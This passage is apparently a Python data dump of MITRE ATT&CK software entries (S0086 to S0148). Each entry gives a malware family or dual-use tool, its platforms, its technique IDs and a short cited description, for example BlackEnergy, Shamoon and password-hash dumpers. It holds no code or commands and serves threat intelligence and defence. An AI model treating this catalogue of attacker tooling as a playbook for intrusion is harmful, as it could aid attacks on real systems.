           'name': 'ZLib',
           'platforms': ['Windows'],
           'software_id': 'S0086',
           'type': 'malware'},
 'S0087': {'attack_ids': ['T1071', 'T1107', 'T1027', 'T1060', 'T1043', 'T1079', 'T1117', 'T1105', 'T1059'],
           'description': '[Hi-Zor](https://attack.mitre.org/software/S0087) is a remote access tool (RAT) that has '
                          'characteristics similar to [Sakula](https://attack.mitre.org/software/S0074). It was used '
                          'in a campaign named INOCNATION. (Citation: Fidelis Hi-Zor)',
           'name': 'Hi-Zor',
           'platforms': ['Windows'],
           'software_id': 'S0087',
           'type': 'malware'},
 'S0088': {'attack_ids': ['T1056', 'T1082', 'T1060', 'T1113', 'T1057', 'T1089', 'T1083', 'T1063', 'T1105', 'T1059'],
           'description': '[Kasidet](https://attack.mitre.org/software/S0088) is a backdoor that has been dropped by '
                          'using malicious VBA macros. (Citation: Zscaler Kasidet)',
           'name': 'Kasidet',
           'platforms': ['Windows'],
           'software_id': 'S0088',
           'type': 'malware'},
 'S0089': {'attack_ids': ['T1055',
                          'T1044',
                          'T1047',
                          'T1485',
                          'T1056',
                          'T1082',
                          'T1503',
                          'T1070',
                          'T1050',
                          'T1077',
                          'T1016',
                          'T1057',
                          'T1046',
                          'T1088',
                          'T1083',
                          'T1071',
                          'T1008',
                          'T1060',
                          'T1081',
                          'T1113',
                          'T1049',
                          'T1120',
                          'T1023'],
           'description': '[BlackEnergy](https://attack.mitre.org/software/S0089) is a malware toolkit that has been '
                          'used by both criminal and APT actors. It dates back to at least 2007 and was originally '
                          'designed to create botnets for use in conducting Distributed Denial of Service (DDoS) '
                          'attacks, but its use has evolved to support various plug-ins. It is well known for being '
                          'used during the confrontation between Georgia and Russia in 2008, as well as in targeting '
                          'Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. (Citation: '
                          'F-Secure BlackEnergy 2014)',
           'name': 'BlackEnergy',
           'platforms': ['Windows'],
           'software_id': 'S0089',
           'type': 'malware'},
 'S0090': {'attack_ids': ['T1020', 'T1112', 'T1074', 'T1056', 'T1025', 'T1005', 'T1060', 'T1113', 'T1083', 'T1119'],
           'description': '[Rover](https://attack.mitre.org/software/S0090) is malware suspected of being used for '
                          'espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to '
                          'Afghanistan. (Citation: Palo Alto Rover)',
           'name': 'Rover',
           'platforms': ['Windows'],
           'software_id': 'S0090',
           'type': 'malware'},
 'S0091': {'attack_ids': ['T1087',
                          'T1032',
                          'T1181',
                          'T1007',
                          'T1002',
                          'T1082',
                          'T1022',
                          'T1116',
                          'T1012',
                          'T1124',
                          'T1018',
                          'T1016',
                          'T1107',
                          'T1069',
                          'T1057',
                          'T1083',
                          'T1071',
                          'T1027',
                          'T1063',
                          'T1049',
                          'T1033'],
           'description': '[Epic](https://attack.mitre.org/software/S0091) is a backdoor that has been used by '
                          '[Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)',
           'name': 'Epic',
           'platforms': ['Windows'],
           'software_id': 'S0091',
           'type': 'malware'},
 'S0092': {'attack_ids': ['T1016', 'T1091', 'T1022', 'T1052', 'T1033', 'T1105'],
           'description': '[Agent.btz](https://attack.mitre.org/software/S0092) is a worm that primarily spreads '
                          'itself via removable devices such as USB drives. It reportedly infected U.S. military '
                          'networks in 2008. (Citation: Securelist Agent.btz)',
           'name': 'Agent.btz',
           'platforms': ['Windows'],
           'software_id': 'S0092',
           'type': 'malware'},
 'S0093': {'attack_ids': ['T1003',
                          'T1107',
                          'T1016',
                          'T1055',
                          'T1082',
                          'T1060',
                          'T1057',
                          'T1114',
                          'T1022',
                          'T1001',
                          'T1083',
                          'T1033'],
           'description': '[Backdoor.Oldrea](https://attack.mitre.org/software/S0093) is a backdoor used by '
                          '[Dragonfly](https://attack.mitre.org/groups/G0035). It appears to be custom malware '
                          'authored by the group or specifically for it. (Citation: Symantec Dragonfly)',
           'name': 'Backdoor.Oldrea',
           'platforms': ['Windows'],
           'software_id': 'S0093',
           'type': 'malware'},
 'S0094': {'attack_ids': ['T1003', 'T1074', 'T1113', 'T1060', 'T1045', 'T1057', 'T1105'],
           'description': '[Trojan.Karagany](https://attack.mitre.org/software/S0094) is a backdoor primarily used for '
                          'recon. The source code for it was leaked in 2010 and it is sold on underground forums. '
                          '(Citation: Symantec Dragonfly)',
           'name': 'Trojan.Karagany',
           'platforms': ['Windows'],
           'software_id': 'S0094',
           'type': 'malware'},
 'S0095': {'attack_ids': ['T1048', 'T1043'],
           'description': '[FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with '
                          'operating systems to transfer information over the File Transfer Protocol (FTP). '
                          'Adversaries can use it to transfer other tools onto a system or to exfiltrate data. '
                          '(Citation: Wikipedia FTP)',
           'name': 'FTP',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0095',
           'type': 'tool'},
 'S0096': {'attack_ids': ['T1082'],
           'description': '[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used '
                          'to gather detailed information about a computer. (Citation: TechNet Systeminfo)',
           'name': 'Systeminfo',
           'platforms': ['Windows'],
           'software_id': 'S0096',
           'type': 'tool'},
 'S0097': {'attack_ids': ['T1018'],
           'description': '[Ping](https://attack.mitre.org/software/S0097) is an operating system utility commonly '
                          'used to troubleshoot and verify network connections. (Citation: TechNet Ping)',
           'name': 'Ping',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0097',
           'type': 'tool'},
 'S0098': {'attack_ids': ['T1124',
                          'T1016',
                          'T1125',
                          'T1063',
                          'T1082',
                          'T1073',
                          'T1113',
                          'T1022',
                          'T1123',
                          'T1119',
                          'T1103',
                          'T1120',
                          'T1033'],
           'description': '[T9000](https://attack.mitre.org/software/S0098) is a backdoor that is a newer variant of '
                          'the T5000 malware family, also known as Plat1. Its primary function is to gather '
                          'information about the victim. It has been used in multiple targeted attacks against '
                          'U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto '
                          'T9000 Feb 2016)',
           'name': 'T9000',
           'platforms': ['Windows'],
           'software_id': 'S0098',
           'type': 'malware'},
 'S0099': {'attack_ids': ['T1016'],
           'description': "[Arp](https://attack.mitre.org/software/S0099) displays information about a system's "
                          'Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)',
           'name': 'Arp',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0099',
           'type': 'tool'},
 'S0100': {'attack_ids': ['T1016'],
           'description': '[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used '
                          "to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. "
                          '(Citation: TechNet Ipconfig)',
           'name': 'ipconfig',
           'platforms': ['Windows'],
           'software_id': 'S0100',
           'type': 'tool'},
 'S0101': {'attack_ids': ['T1016'],
           'description': '[ifconfig](https://attack.mitre.org/software/S0101) is a Unix-based utility used to gather '
                          'information about and interact with the TCP/IP settings on a system. (Citation: Wikipedia '
                          'Ifconfig)',
           'name': 'ifconfig',
           'platforms': ['Linux'],
           'software_id': 'S0101',
           'type': 'tool'},
 'S0102': {'attack_ids': ['T1049', 'T1016'],
           'description': '[nbtstat](https://attack.mitre.org/software/S0102) is a utility used to troubleshoot '
                          'NetBIOS name resolution. (Citation: TechNet Nbtstat)',
           'name': 'nbtstat',
           'platforms': ['Windows'],
           'software_id': 'S0102',
           'type': 'tool'},
 'S0103': {'attack_ids': ['T1016'],
           'description': '[route](https://attack.mitre.org/software/S0103) can be used to find or change information '
                          'within the local system IP routing table. (Citation: TechNet Route)',
           'name': 'route',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0103',
           'type': 'tool'},
 'S0104': {'attack_ids': ['T1049'],
           'description': '[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that '
                          'displays active TCP connections, listening ports, and network statistics. (Citation: '
                          'TechNet Netstat)',
           'name': 'netstat',
           'platforms': ['Windows', 'Linux', 'macOS'],
           'software_id': 'S0104',
           'type': 'tool'},
 'S0105': {'attack_ids': ['T1482', 'T1069', 'T1087'],
           'description': '[dsquery](https://attack.mitre.org/software/S0105) is a command-line utility that can be '
                          'used to query Active Directory for information from a system within a domain. (Citation: '
                          'TechNet Dsquery) It is typically installed only on Windows Server versions but can be '
                          'installed on non-server variants through the Microsoft-provided Remote Server '
                          'Administration Tools bundle.',
           'name': 'dsquery',
           'platforms': ['Windows'],
           'software_id': 'S0105',
           'type': 'tool'},
 'S0106': {'attack_ids': ['T1107', 'T1082', 'T1083', 'T1105', 'T1059'],
           'description': '[cmd](https://attack.mitre.org/software/S0106) is the Windows command-line interpreter that '
                          'can be used to interact with systems and execute other processes and utilities. (Citation: '
                          'TechNet Cmd)\n'
                          '\n'
                          'Cmd.exe contains native functionality to perform many operations to interact with the '
                          'system, including listing files in a directory (e.g., <code>dir</code> (Citation: TechNet '
                          'Dir)), deleting files (e.g., <code>del</code> (Citation: TechNet Del)), and copying files '
                          '(e.g., <code>copy</code> (Citation: TechNet Copy)).',
           'name': 'cmd',
           'platforms': ['Windows'],
           'software_id': 'S0106',
           'type': 'tool'},
 'S0107': {'attack_ids': ['T1048', 'T1103', 'T1107'],
           'description': '[Cherry Picker](https://attack.mitre.org/software/S0107) is a point of sale (PoS) memory '
                          'scraper. (Citation: Trustwave Cherry Picker)',
           'name': 'Cherry Picker',
           'platforms': ['Windows'],
           'software_id': 'S0107',
           'type': 'malware'},
 'S0108': {'attack_ids': ['T1128', 'T1063', 'T1089', 'T1090'],
           'description': '[netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact '
                          'with networking components on local or remote systems. (Citation: TechNet Netsh)',
           'name': 'netsh',
           'platforms': ['Windows'],
           'software_id': 'S0108',
           'type': 'tool'},
 'S0109': {'attack_ids': ['T1105', 'T1038', 'T1059'],
           'description': '[WEBC2](https://attack.mitre.org/software/S0109) is a backdoor used by '
                          '[APT1](https://attack.mitre.org/groups/G0006) to retrieve a Web page from a predetermined '
                          'C2 server. (Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1)',
           'name': 'WEBC2',
           'platforms': ['Windows'],
           'software_id': 'S0109',
           'type': 'malware'},
 'S0110': {'attack_ids': ['T1053'],
           'description': '[at](https://attack.mitre.org/software/S0110) is used to schedule tasks on a system to run '
                          'at a specified date or time. (Citation: TechNet At)',
           'name': 'at',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0110',
           'type': 'tool'},
 'S0111': {'attack_ids': ['T1053'],
           'description': '[schtasks](https://attack.mitre.org/software/S0111) is used to schedule execution of '
                          'programs or scripts on a Windows system to run at a specific date and time. (Citation: '
                          'TechNet Schtasks)',
           'name': 'schtasks',
           'platforms': ['Windows'],
           'software_id': 'S0111',
           'type': 'tool'},
 'S0112': {'attack_ids': ['T1067'],
           'description': '[ROCKBOOT](https://attack.mitre.org/software/S0112) is a '
                          '[Bootkit](https://attack.mitre.org/techniques/T1067) that has been used by an unidentified, '
                          'suspected China-based group. (Citation: FireEye Bootkits)',
           'name': 'ROCKBOOT',
           'platforms': ['Windows'],
           'software_id': 'S0112',
           'type': 'malware'},
 'S0113': {'attack_ids': ['T1032',
                          'T1002',
                          'T1085',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1503',
                          'T1038',
                          'T1022',
                          'T1070',
                          'T1003',
                          'T1016',
                          'T1083',
                          'T1027',
                          'T1074',
                          'T1025',
                          'T1060',
                          'T1113',
                          'T1063',
                          'T1033',
                          'T1120'],
           'description': '[Prikormka](https://attack.mitre.org/software/S0113) is a malware family used in a campaign '
                          'known as Operation Groundbait. It has predominantly been observed in Ukraine and was used '
                          'as early as 2008. (Citation: ESET Operation Groundbait)',
           'name': 'Prikormka',
           'platforms': ['Windows'],
           'software_id': 'S0113',
           'type': 'malware'},
 'S0114': {'attack_ids': ['T1067'],
           'description': '[BOOTRASH](https://attack.mitre.org/software/S0114) is a '
                          '[Bootkit](https://attack.mitre.org/techniques/T1067) that targets Windows operating '
                          'systems. It has been used by threat actors that target the financial sector. (Citation: '
                          'MTrends 2016)',
           'name': 'BOOTRASH',
           'platforms': ['Windows'],
           'software_id': 'S0114',
           'type': 'malware'},
 'S0115': {'attack_ids': ['T1095',
                          'T1094',
                          'T1003',
                          'T1016',
                          'T1082',
                          'T1025',
                          'T1113',
                          'T1057',
                          'T1114',
                          'T1083',
                          'T1063',
                          'T1105'],
           'description': '[Crimson](https://attack.mitre.org/software/S0115) is malware used as part of a campaign '
                          'known as Operation Transparent Tribe that targeted Indian diplomatic and military victims. '
                          '(Citation: Proofpoint Operation Transparent Tribe March 2016)',
           'name': 'Crimson',
           'platforms': ['Windows'],
           'software_id': 'S0115',
           'type': 'malware'},
 'S0116': {'attack_ids': ['T1088'],
           'description': '[UACMe](https://attack.mitre.org/software/S0116) is an open source assessment tool that '
                          'contains many methods for bypassing Windows User Account Control on multiple versions of '
                          'the operating system. (Citation: Github UACMe)',
           'name': 'UACMe',
           'platforms': ['Windows'],
           'software_id': 'S0116',
           'type': 'tool'},
 'S0117': {'attack_ids': ['T1009', 'T1027', 'T1032', 'T1090', 'T1008', 'T1081', 'T1046', 'T1105', 'T1059'],
           'description': '[XTunnel](https://attack.mitre.org/software/S0117) a VPN-like network proxy tool that can '
                          'relay traffic between a C2 server and a victim. It was first seen in May 2013 and '
                          'reportedly used by [APT28](https://attack.mitre.org/groups/G0007) during the compromise of '
                          'the Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: '
                          'Invincea XTunnel) (Citation: ESET Sednit Part 2)',
           'name': 'XTunnel',
           'platforms': ['Windows'],
           'software_id': 'S0117',
           'type': 'malware'},
 'S0118': {'attack_ids': ['T1032', 'T1043', 'T1036', 'T1050', 'T1105'],
           'description': '[Nidiran](https://attack.mitre.org/software/S0118) is a custom backdoor developed and used '
                          'by [Suckfly](https://attack.mitre.org/groups/G0039). It has been delivered via strategic '
                          'web compromise. (Citation: Symantec Suckfly March 2016)',
           'name': 'Nidiran',
           'platforms': ['Windows'],
           'software_id': 'S0118',
           'type': 'malware'},
 'S0119': {'attack_ids': ['T1003'],
           'description': '[Cachedump](https://attack.mitre.org/software/S0119) is a publicly-available tool that '
                          'program extracts cached password hashes from a system’s registry. (Citation: Mandiant APT1)',
           'name': 'Cachedump',
           'platforms': ['Windows'],
           'software_id': 'S0119',
           'type': 'tool'},
 'S0120': {'attack_ids': ['T1003'],
           'description': '[Fgdump](https://attack.mitre.org/software/S0120) is a Windows password hash dumper. '
                          '(Citation: Mandiant APT1)',
           'name': 'Fgdump',
           'platforms': ['Windows'],
           'software_id': 'S0120',
           'type': 'tool'},
 'S0121': {'attack_ids': ['T1003'],
           'description': '[Lslsass](https://attack.mitre.org/software/S0121) is a publicly-available tool that can '
                          'dump active logon session password hashes from the lsass process. (Citation: Mandiant APT1)',
           'name': 'Lslsass',
           'platforms': ['Windows'],
           'software_id': 'S0121',
           'type': 'tool'},
 'S0122': {'attack_ids': ['T1075'],
           'description': '[Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) is a toolkit that allows '
                          'an adversary to "pass" a password hash (without knowing the original password) to log in to '
                          'systems. (Citation: Mandiant APT1)',
           'name': 'Pass-The-Hash Toolkit',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0122',
           'type': 'tool'},
 'S0123': {'attack_ids': ['T1035'],
           'description': '[xCmd](https://attack.mitre.org/software/S0123) is an open source tool that is similar to '
                          '[PsExec](https://attack.mitre.org/software/S0029) and allows the user to execute '
                          'applications on remote systems. (Citation: xCmd)',
           'name': 'xCmd',
           'platforms': ['Windows'],
           'software_id': 'S0123',
           'type': 'tool'},
 'S0124': {'attack_ids': ['T1071', 'T1016', 'T1027', 'T1082', 'T1132', 'T1060', 'T1083', 'T1105', 'T1059'],
           'description': '[Pisloader](https://attack.mitre.org/software/S0124) is a malware family that is notable '
                          'due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has '
                          'been used by [APT18](https://attack.mitre.org/groups/G0026) and is similar to another '
                          'malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), that has been used '
                          'by the group. (Citation: Palo Alto DNS Requests)',
           'name': 'Pisloader',
           'platforms': ['Windows'],
           'software_id': 'S0124',
           'type': 'malware'},
 'S0125': {'attack_ids': ['T1095',
                          'T1094',
                          'T1055',
                          'T1087',
                          'T1032',
                          'T1053',
                          'T1068',
                          'T1056',
                          'T1082',
                          'T1036',
                          'T1048',
                          'T1174',
                          'T1065',
                          'T1018',
                          'T1107',
                          'T1016',
                          'T1003',
                          'T1057',
                          'T1046',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1025',
                          'T1089',
                          'T1052',
                          'T1063',
                          'T1049',
                          'T1033'],
           'description': '[Remsec](https://attack.mitre.org/software/S0125) is a modular backdoor that has been used '
                          'by [Strider](https://attack.mitre.org/groups/G0041) and appears to have been designed '
                          'primarily for espionage purposes. Many of its modules are written in Lua. (Citation: '
                          'Symantec Strider Blog)',
           'name': 'Remsec',
           'platforms': ['Windows'],
           'software_id': 'S0125',
           'type': 'malware'},
 'S0126': {'attack_ids': ['T1071', 'T1122'],
           'description': '[ComRAT](https://attack.mitre.org/software/S0126) is a remote access tool suspected of '
                          'being a decedent of [Agent.btz](https://attack.mitre.org/software/S0092) and used by '
                          '[Turla](https://attack.mitre.org/groups/G0010). (Citation: Symantec Waterbug) (Citation: '
                          'NorthSec 2015 GData Uroburos Tools)',
           'name': 'ComRAT',
           'platforms': ['Windows'],
           'software_id': 'S0126',
           'type': 'malware'},
 'S0127': {'attack_ids': ['T1140',
                          'T1071',
                          'T1024',
                          'T1107',
                          'T1007',
                          'T1073',
                          'T1060',
                          'T1043',
                          'T1057',
                          'T1093',
                          'T1122',
                          'T1083',
                          'T1035',
                          'T1002',
                          'T1031'],
           'description': '[BBSRAT](https://attack.mitre.org/software/S0127) is malware with remote access tool '
                          'functionality that has been used in targeted compromises. (Citation: Palo Alto Networks '
                          'BBSRAT)',
           'name': 'BBSRAT',
           'platforms': ['Windows'],
           'software_id': 'S0127',
           'type': 'malware'},
 'S0128': {'attack_ids': ['T1024',
                          'T1053',
                          'T1106',
                          'T1059',
                          'T1056',
                          'T1132',
                          'T1073',
                          'T1005',
                          'T1036',
                          'T1102',
                          'T1039',
                          'T1116',
                          'T1119',
                          'T1093',
                          'T1001',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1025',
                          'T1060',
                          'T1113',
                          'T1120'],
           'description': '[BADNEWS](https://attack.mitre.org/software/S0128) is malware that has been used by the '
                          'actors responsible for the [Patchwork](https://attack.mitre.org/groups/G0040) campaign. Its '
                          'name was given due to its use of RSS feeds, forums, and blogs for command and control. '
                          '(Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017)',
           'name': 'BADNEWS',
           'platforms': ['Windows'],
           'software_id': 'S0128',
           'type': 'malware'},
 'S0129': {'attack_ids': ['T1083', 'T1132', 'T1088', 'T1086'],
           'description': '[AutoIt backdoor](https://attack.mitre.org/software/S0129) is malware that has been used by '
                          'the actors responsible for the MONSOON campaign. The actors frequently used it in '
                          'weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) This malware '
                          'makes use of the legitimate scripting language for Windows GUI automation with the same '
                          'name.',
           'name': 'AutoIt backdoor',
           'platforms': ['Windows'],
           'software_id': 'S0129',
           'type': 'malware'},
 'S0130': {'attack_ids': ['T1003', 'T1016', 'T1056', 'T1082', 'T1091', 'T1089', 'T1033', 'T1105'],
           'description': '[Unknown Logger](https://attack.mitre.org/software/S0130) is a publicly released, free '
                          'backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the '
                          'MONSOON campaign. (Citation: Forcepoint Monsoon)',
           'name': 'Unknown Logger',
           'platforms': ['Windows'],
           'software_id': 'S0130',
           'type': 'malware'},
 'S0131': {'attack_ids': ['T1083', 'T1020', 'T1027', 'T1060'],
           'description': '[TINYTYPHON](https://attack.mitre.org/software/S0131) is a backdoor  that has been used by '
                          'the actors responsible for the MONSOON campaign. The majority of its code was reportedly '
                          'taken from the MyDoom worm. (Citation: Forcepoint Monsoon)',
           'name': 'TINYTYPHON',
           'platforms': ['Windows'],
           'software_id': 'S0131',
           'type': 'malware'},
 'S0132': {'attack_ids': ['T1003',
                          'T1027',
                          'T1032',
                          'T1091',
                          'T1490',
                          'T1045',
                          'T1089',
                          'T1001',
                          'T1088',
                          'T1080',
                          'T1105',
                          'T1059'],
           'description': '[H1N1](https://attack.mitre.org/software/S0132) is a malware variant that has been '
                          'distributed via a campaign using VBA macros to infect victims. Although it initially had '
                          'only loader capabilities, it has evolved to include information-stealing functionality. '
                          '(Citation: Cisco H1N1 Part 1)',
           'name': 'H1N1',
           'platforms': ['Windows'],
           'software_id': 'S0132',
           'type': 'malware'},
 'S0133': {'attack_ids': ['T1080'],
           'description': '[Miner-C](https://attack.mitre.org/software/S0133) is malware that mines victims for the '
                          'Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) '
                          'devices to spread. (Citation: Softpedia MinerC)',
           'name': 'Miner-C',
           'platforms': ['Windows'],
           'software_id': 'S0133',
           'type': 'malware'},
 'S0134': {'attack_ids': ['T1032', 'T1038', 'T1001', 'T1088', 'T1105'],
           'description': '[Downdelph](https://attack.mitre.org/software/S0134) is a first-stage downloader written in '
                          'Delphi that has been used by [APT28](https://attack.mitre.org/groups/G0007) in rare '
                          'instances between 2013 and 2015. (Citation: ESET Sednit Part 3)',
           'name': 'Downdelph',
           'platforms': ['Windows'],
           'software_id': 'S0134',
           'type': 'malware'},
 'S0135': {'attack_ids': ['T1014', 'T1055'],
           'description': '[HIDEDRV](https://attack.mitre.org/software/S0135) is a rootkit used by '
                          '[APT28](https://attack.mitre.org/groups/G0007). It has been deployed along with '
                          '[Downdelph](https://attack.mitre.org/software/S0134) to execute and hide that malware. '
                          '(Citation: ESET Sednit Part 3) (Citation: Sekoia HideDRV Oct 2016)',
           'name': 'HIDEDRV',
           'platforms': ['Windows'],
           'software_id': 'S0135',
           'type': 'malware'},
 'S0136': {'attack_ids': ['T1107',
                          'T1027',
                          'T1020',
                          'T1074',
                          'T1099',
                          'T1091',
                          'T1092',
                          'T1025',
                          'T1060',
                          'T1036',
                          'T1052',
                          'T1083',
                          'T1119',
                          'T1120'],
           'description': '[USBStealer](https://attack.mitre.org/software/S0136) is malware that has used by '
                          '[APT28](https://attack.mitre.org/groups/G0007) since at least 2005 to extract information '
                          'from air-gapped networks. It does not have the capability to communicate over the Internet '
                          'and has been used in conjunction with '
                          '[ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer '
                          '2014) (Citation: Kaspersky Sofacy)',
           'name': 'USBStealer',
           'platforms': ['Windows'],
           'software_id': 'S0136',
           'type': 'malware'},
 'S0137': {'attack_ids': ['T1071', 'T1009', 'T1024', 'T1027', 'T1085', 'T1082', 'T1132', 'T1060', 'T1105'],
           'description': '[CORESHELL](https://attack.mitre.org/software/S0137) is a downloader used by '
                          '[APT28](https://attack.mitre.org/groups/G0007). The older versions of this malware are '
                          'known as SOURFACE and newer versions as CORESHELL.(Citation: FireEye APT28) (Citation: '
                          'FireEye APT28 January 2017)',
           'name': 'CORESHELL',
           'platforms': ['Windows'],
           'software_id': 'S0137',
           'type': 'malware'},
 'S0138': {'attack_ids': ['T1036', 'T1071', 'T1003', 'T1027'],
           'description': '[OLDBAIT](https://attack.mitre.org/software/S0138) is a credential harvester used by '
                          '[APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: '
                          'FireEye APT28 January 2017)',
           'name': 'OLDBAIT',
           'platforms': ['Windows'],
           'software_id': 'S0138',
           'type': 'malware'},
 'S0139': {'attack_ids': ['T1124',
                          'T1010',
                          'T1107',
                          'T1016',
                          'T1027',
                          'T1085',
                          'T1485',
                          'T1082',
                          'T1096',
                          'T1060',
                          'T1057',
                          'T1043',
                          'T1083',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[PowerDuke](https://attack.mitre.org/software/S0139) is a backdoor that was used by '
                          '[APT29](https://attack.mitre.org/groups/G0016) in 2016. It has primarily been delivered '
                          'through Microsoft Word or Excel attachments containing malicious macros. (Citation: '
                          'Volexity PowerDuke November 2016)',
           'name': 'PowerDuke',
           'platforms': ['Windows'],
           'software_id': 'S0139',
           'type': 'malware'},
 'S0140': {'attack_ids': ['T1053',
                          'T1485',
                          'T1082',
                          'T1036',
                          'T1012',
                          'T1487',
                          'T1050',
                          'T1124',
                          'T1077',
                          'T1018',
                          'T1016',
                          'T1088',
                          'T1486',
                          'T1035',
                          'T1105',
                          'T1071',
                          'T1027',
                          'T1112',
                          'T1043',
                          'T1078'],
           'description': '[Shamoon](https://attack.mitre.org/software/S0140) is wiper malware that was first used by '
                          'an Iranian group known as the "Cutting Sword of Justice" in 2012. Other versions known as '
                          'Shamoon 2 and Shamoon 3 were observed in 2016 and 2018. '
                          '[Shamoon](https://attack.mitre.org/software/S0140) has also been seen leveraging '
                          '[RawDisk](https://attack.mitre.org/software/S0364) to carry out data wiping tasks. The term '
                          'Shamoon is sometimes used to refer to the group using the malware as well as the malware '
                          'itself.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)(Citation: '
                          'Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)',
           'name': 'Shamoon',
           'platforms': ['Windows'],
           'software_id': 'S0140',
           'type': 'malware'},
 'S0141': {'attack_ids': ['T1036', 'T1050', 'T1085'],
           'description': '[Winnti](https://attack.mitre.org/software/S0141) is a Trojan that has been used by '
                          'multiple groups to carry out intrusions in varied regions from at least 2010 to 2016. One '
                          'of the groups using this malware is referred to by the same name, [Winnti '
                          'Group](https://attack.mitre.org/groups/G0044); however, reporting indicates a second '
                          'distinct group, [Axiom](https://attack.mitre.org/groups/G0001), also uses the malware. '
                          '(Citation: Kaspersky Winnti April 2013) (Citation: Microsoft Winnti Jan 2017) (Citation: '
                          'Novetta Winnti April 2015)',
           'name': 'Winnti',
           'platforms': ['Windows'],
           'software_id': 'S0141',
           'type': 'malware'},
 'S0142': {'attack_ids': ['T1027', 'T1112', 'T1085', 'T1082', 'T1057', 'T1083', 'T1063', 'T1050', 'T1059'],
           'description': '[StreamEx](https://attack.mitre.org/software/S0142) is a malware family that has been used '
                          'by [Deep Panda](https://attack.mitre.org/groups/G0009) since at least 2015. In 2016, it was '
                          'distributed via legitimate compromised Korean websites. (Citation: Cylance Shell Crew Feb '
                          '2017)',
           'name': 'StreamEx',
           'platforms': ['Windows'],
           'software_id': 'S0142',
           'type': 'malware'},
 'S0143': {'attack_ids': ['T1123', 'T1136', 'T1085', 'T1091', 'T1113', 'T1131', 'T1011', 'T1210', 'T1063'],
           'description': 'Flame is a sophisticated toolkit that has been used to collect information since at least '
                          '2010, largely targeting Middle East countries. (Citation: Kaspersky Flame)',
           'name': 'Flame',
           'platforms': ['Windows'],
           'software_id': 'S0143',
           'type': 'malware'},
 'S0144': {'attack_ids': ['T1071',
                          'T1003',
                          'T1024',
                          'T1032',
                          'T1082',
                          'T1060',
                          'T1057',
                          'T1036',
                          'T1089',
                          'T1116',
                          'T1083',
                          'T1105'],
           'description': '[ChChes](https://attack.mitre.org/software/S0144) is a Trojan that appears to be used '
                          'exclusively by [menuPass](https://attack.mitre.org/groups/G0045). It was used to target '
                          'Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended '
                          'as a first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb '
                          '2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)',
           'name': 'ChChes',
           'platforms': ['Windows'],
           'software_id': 'S0144',
           'type': 'malware'},
 'S0145': {'attack_ids': ['T1071', 'T1096', 'T1060', 'T1086', 'T1012', 'T1105'],
           'description': '[POWERSOURCE](https://attack.mitre.org/software/S0145) is a PowerShell backdoor that is a '
                          'heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It '
                          'was observed in February 2017 in spearphishing campaigns against personnel involved with '
                          'United States Securities and Exchange Commission (SEC) filings at various organizations. '
                          'The malware was delivered when macros were enabled by the victim and a VBS script was '
                          'dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017)',
           'name': 'POWERSOURCE',
           'platforms': ['Windows'],
           'software_id': 'S0145',
           'type': 'malware'},
 'S0146': {'attack_ids': ['T1071', 'T1059'],
           'description': '[TEXTMATE](https://attack.mitre.org/software/S0146) is a second-stage PowerShell backdoor '
                          'that is memory-resident. It was observed being used along with '
                          '[POWERSOURCE](https://attack.mitre.org/software/S0145) in February 2017. (Citation: FireEye '
                          'FIN7 March 2017)',
           'name': 'TEXTMATE',
           'platforms': ['Windows'],
           'software_id': 'S0146',
           'type': 'malware'},
 'S0147': {'attack_ids': ['T1071',
                          'T1107',
                          'T1074',
                          'T1085',
                          'T1053',
                          'T1113',
                          'T1060',
                          'T1041',
                          'T1083',
                          'T1105',
                          'T1059'],
           'description': '[Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by '
                          '[Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon '
                          'Feb 2017)',
           'name': 'Pteranodon',
           'platforms': ['Windows'],
           'software_id': 'S0147',
           'type': 'malware'},
 'S0148': {'attack_ids': ['T1094',
                          'T1024',
                          'T1053',
                          'T1130',
                          'T1059',
                          'T1085',
                          'T1056',
                          'T1082',
                          'T1116',
                          'T1070',
                          'T1119',
                          'T1124',
                          'T1107',
                          'T1057',
                          'T1088',
                          'T1083',
                          'T1105',
                          'T1027',
                          'T1112',
                          'T1113',
                          'T1060',
                          'T1063',
                          'T1033',
